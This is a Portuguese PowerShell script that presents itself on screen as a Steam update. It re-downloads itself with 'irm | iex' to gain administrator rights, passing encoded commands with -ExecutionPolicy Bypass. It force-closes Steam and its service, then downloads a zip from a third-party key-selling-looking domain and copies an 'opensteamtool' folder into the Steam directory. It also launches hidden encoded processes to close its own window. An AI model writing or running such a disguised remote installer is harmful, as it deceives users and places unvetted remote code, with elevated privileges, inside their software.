$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Link RAW deste proprio script
$ScriptUrl = "https://raw.githubusercontent.com/VXL1337/Correcao-Keys/main/correcao-keys.ps1"

# Link do pacote
$ZipUrl = "https://pandorakeys.com/admin/Correcao.zip"

# Configuracao interna
$NomePasta = "opensteamtool"
$PastaTemporaria = Join-Path $env:TEMP "SteamFix"
$ArquivoZip = Join-Path $PastaTemporaria "correcao.zip"
$PastaExtraida = Join-Path $PastaTemporaria "extraido"

function Testar-Administrador {
    $Identidade = [Security.Principal.WindowsIdentity]::GetCurrent()

    $Principal = New-Object `
        Security.Principal.WindowsPrincipal($Identidade)

    return $Principal.IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator
    )
}

function Agendar-Fechamento {
    param(
        [int]$Segundos = 3
    )

    $PidAlvo = $PID

    $CodigoAuxiliar = @"
Start-Sleep -Seconds $Segundos
Stop-Process -Id $PidAlvo -Force -ErrorAction SilentlyContinue
"@

    $Bytes = [Text.Encoding]::Unicode.GetBytes($CodigoAuxiliar)
    $ComandoCodificado = [Convert]::ToBase64String($Bytes)

    $PowerShellExe = Join-Path `
        $env:SystemRoot `
        "System32\WindowsPowerShell\v1.0\powershell.exe"

    Start-Process `
        -FilePath $PowerShellExe `
        -WindowStyle Hidden `
        -ArgumentList @(
            "-NoProfile",
            "-WindowStyle", "Hidden",
            "-EncodedCommand", $ComandoCodificado
        ) |
        Out-Null
}

function Mostrar-Etapa {
    param(
        [string]$Mensagem
    )

    Write-Host "  $Mensagem" -ForegroundColor Cyan
}

function Encontrar-Steam {
    $Caminhos = @()

    $RegistroUsuario = Get-ItemProperty `
        -Path "HKCU:\Software\Valve\Steam" `
        -ErrorAction SilentlyContinue

    if ($RegistroUsuario.SteamPath) {
        $Caminhos += $RegistroUsuario.SteamPath
    }

    $Registro64 = Get-ItemProperty `
        -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" `
        -ErrorAction SilentlyContinue

    if ($Registro64.InstallPath) {
        $Caminhos += $Registro64.InstallPath
    }

    $Registro32 = Get-ItemProperty `
        -Path "HKLM:\SOFTWARE\Valve\Steam" `
        -ErrorAction SilentlyContinue

    if ($Registro32.InstallPath) {
        $Caminhos += $Registro32.InstallPath
    }

    if (${env:ProgramFiles(x86)}) {
        $Caminhos += "${env:ProgramFiles(x86)}\Steam"
    }

    if ($env:ProgramFiles) {
        $Caminhos += "$env:ProgramFiles\Steam"
    }

    if ($env:LOCALAPPDATA) {
        $Caminhos += "$env:LOCALAPPDATA\Steam"
    }

    return $Caminhos |
        Select-Object -Unique |
        Where-Object {
            $_ -and
            (Test-Path (Join-Path $_ "steam.exe"))
        } |
        Select-Object -First 1
}

function Encerrar-Steam {
    param(
        [string]$SteamPath
    )

    $SteamExe = Join-Path $SteamPath "steam.exe"

    # Primeiro solicita o encerramento normal
    if (Test-Path $SteamExe) {
        Start-Process `
            -FilePath $SteamExe `
            -ArgumentList "-shutdown" `
            -WindowStyle Hidden `
            -ErrorAction SilentlyContinue
    }

    Start-Sleep -Seconds 4

    # Interrompe o servico
    $ServicoSteam = Get-Service `
        -Name "Steam Client Service" `
        -ErrorAction SilentlyContinue

    if ($ServicoSteam) {
        Stop-Service `
            -InputObject $ServicoSteam `
            -Force `
            -ErrorAction SilentlyContinue

        try {
            $ServicoSteam.WaitForStatus(
                "Stopped",
                [TimeSpan]::FromSeconds(10)
            )
        }
        catch {}
    }

    $ProcessosSteam = @(
        "steam",
        "steamwebhelper",
        "GameOverlayUI",
        "steamservice",
        "steamerrorreporter",
        "steamerrorreporter64",
        "steam_monitor",
        "steamxboxutil",
        "steamxboxutil64"
    )

    $TaskKill = Join-Path `
        $env:SystemRoot `
        "System32\taskkill.exe"

    # Encerra cada processo e seus processos filhos
    foreach ($Processo in $ProcessosSteam) {
        & $TaskKill `
            /F `
            /T `
            /IM "$Processo.exe" `
            2>$null |
            Out-Null
    }

    # Confirma que tudo foi encerrado
    $TempoLimite = (Get-Date).AddSeconds(20)

    do {
        $ProcessosRestantes = Get-Process `
            -Name $ProcessosSteam `
            -ErrorAction SilentlyContinue

        if (-not $ProcessosRestantes) {
            break
        }

        $ProcessosRestantes |
            Stop-Process `
                -Force `
                -ErrorAction SilentlyContinue

        Start-Sleep -Seconds 1
    }
    while ((Get-Date) -lt $TempoLimite)

    $ProcessosRestantes = Get-Process `
        -Name $ProcessosSteam `
        -ErrorAction SilentlyContinue

    if ($ProcessosRestantes) {
        throw "A Steam nao foi encerrada completamente."
    }

    Start-Sleep -Seconds 2
}

# Solicita administrador automaticamente
if (-not (Testar-Administrador)) {
    Clear-Host

    Write-Host ""
    Write-Host "  =======================================" `
        -ForegroundColor DarkMagenta
    Write-Host "          ATUALIZACAO DA STEAM" `
        -ForegroundColor Magenta
    Write-Host "  =======================================" `
        -ForegroundColor DarkMagenta
    Write-Host ""
    Write-Host "  Solicitando permissao de administrador..." `
        -ForegroundColor Cyan
    Write-Host ""

    try {
        $ComandoElevado = "irm '$ScriptUrl' | iex"

        $BytesElevados = [Text.Encoding]::Unicode.GetBytes(
            $ComandoElevado
        )

        $ComandoElevadoCodificado = [Convert]::ToBase64String(
            $BytesElevados
        )

        $PowerShellExe = Join-Path `
            $env:SystemRoot `
            "System32\WindowsPowerShell\v1.0\powershell.exe"

        Start-Process `
            -FilePath $PowerShellExe `
            -Verb RunAs `
            -ArgumentList @(
                "-NoProfile",
                "-ExecutionPolicy", "Bypass",
                "-EncodedCommand", $ComandoElevadoCodificado
            )

        Agendar-Fechamento -Segundos 1
        return
    }
    catch {
        Clear-Host

        Write-Host ""
        Write-Host "  =======================================" `
            -ForegroundColor DarkRed
        Write-Host "       PERMISSAO NAO CONCEDIDA" `
            -ForegroundColor Red
        Write-Host "  =======================================" `
            -ForegroundColor DarkRed
        Write-Host ""
        Write-Host "  A atualizacao precisa de permissao" `
            -ForegroundColor Yellow
        Write-Host "  de administrador para continuar." `
            -ForegroundColor Yellow
        Write-Host ""
        Write-Host "  Fechando em 5 segundos..." `
            -ForegroundColor DarkGray

        Agendar-Fechamento -Segundos 5
        return
    }
}

Clear-Host

try {
    $Host.UI.RawUI.WindowTitle = "Atualizacao da Steam"
}
catch {}

Write-Host ""
Write-Host "  =======================================" `
    -ForegroundColor DarkMagenta
Write-Host "          ATUALIZACAO DA STEAM" `
    -ForegroundColor Magenta
Write-Host "  =======================================" `
    -ForegroundColor DarkMagenta
Write-Host ""
Write-Host "  Aguarde enquanto preparamos tudo..." `
    -ForegroundColor Gray
Write-Host ""

try {
    Mostrar-Etapa "Verificando a instalacao..."

    $SteamPath = Encontrar-Steam

    if (-not $SteamPath) {
        throw "Steam nao encontrada."
    }

    Mostrar-Etapa "Encerrando completamente a Steam..."

    Encerrar-Steam -SteamPath $SteamPath

    Mostrar-Etapa "Preparando a atualizacao..."

    if (Test-Path $PastaTemporaria) {
        Remove-Item `
            -Path $PastaTemporaria `
            -Recurse `
            -Force `
            -ErrorAction SilentlyContinue
    }

    New-Item `
        -ItemType Directory `
        -Path $PastaTemporaria `
        -Force |
        Out-Null

    New-Item `
        -ItemType Directory `
        -Path $PastaExtraida `
        -Force |
        Out-Null

    Mostrar-Etapa "Obtendo os dados necessarios..."

    Invoke-WebRequest `
        -Uri $ZipUrl `
        -OutFile $ArquivoZip `
        -UseBasicParsing

    if (
        -not (Test-Path $ArquivoZip) -or
        (Get-Item $ArquivoZip).Length -eq 0
    ) {
        throw "Nao foi possivel obter a atualizacao."
    }

    Mostrar-Etapa "Aplicando a atualizacao..."

    Expand-Archive `
        -Path $ArquivoZip `
        -DestinationPath $PastaExtraida `
        -Force

    $PastaEncontrada = Get-ChildItem `
        -Path $PastaExtraida `
        -Recurse `
        -Directory `
        -Force |
        Where-Object {
            $_.Name -ieq $NomePasta
        } |
        Select-Object -First 1

    if (-not $PastaEncontrada) {
        throw "O conteudo recebido nao e valido."
    }

    $Destino = Join-Path $SteamPath $NomePasta

    if (Test-Path $Destino) {
        Remove-Item `
            -Path $Destino `
            -Recurse `
            -Force
    }

    Copy-Item `
        -LiteralPath $PastaEncontrada.FullName `
        -Destination $SteamPath `
        -Recurse `
        -Force

    if (-not (Test-Path $Destino)) {
        throw "Nao foi possivel aplicar a atualizacao."
    }

    Mostrar-Etapa "Finalizando..."

    Remove-Item `
        -Path $PastaTemporaria `
        -Recurse `
        -Force `
        -ErrorAction SilentlyContinue

    Start-Sleep -Seconds 1

    $SteamExe = Join-Path $SteamPath "steam.exe"

    if (-not (Test-Path $SteamExe)) {
        throw "Nao foi possivel iniciar a Steam."
    }

    Start-Process `
        -FilePath $SteamExe `
        -WorkingDirectory $SteamPath

    Clear-Host

    Write-Host ""
    Write-Host "  =======================================" `
        -ForegroundColor DarkGreen
    Write-Host "          ATUALIZACAO CONCLUIDA" `
        -ForegroundColor Green
    Write-Host "  =======================================" `
        -ForegroundColor DarkGreen
    Write-Host ""
    Write-Host "  Tudo pronto! A Steam foi reiniciada." `
        -ForegroundColor White
    Write-Host ""
    Write-Host "  Fechando automaticamente em 3 segundos..." `
        -ForegroundColor DarkGray
    Write-Host ""

    Agendar-Fechamento -Segundos 3
    return
}
catch {
    Clear-Host

    Write-Host ""
    Write-Host "  =======================================" `
        -ForegroundColor DarkRed
    Write-Host "       NAO FOI POSSIVEL CONCLUIR" `
        -ForegroundColor Red
    Write-Host "  =======================================" `
        -ForegroundColor DarkRed
    Write-Host ""
    Write-Host "  Verifique sua conexao e tente novamente." `
        -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  Fechando em 5 segundos..." `
        -ForegroundColor DarkGray
    Write-Host ""

    Agendar-Fechamento -Segundos 5
    return
}
finally {
    if (Test-Path $PastaTemporaria) {
        Remove-Item `
            -Path $PastaTemporaria `
            -Recurse `
            -Force `
            -ErrorAction SilentlyContinue
    }
}
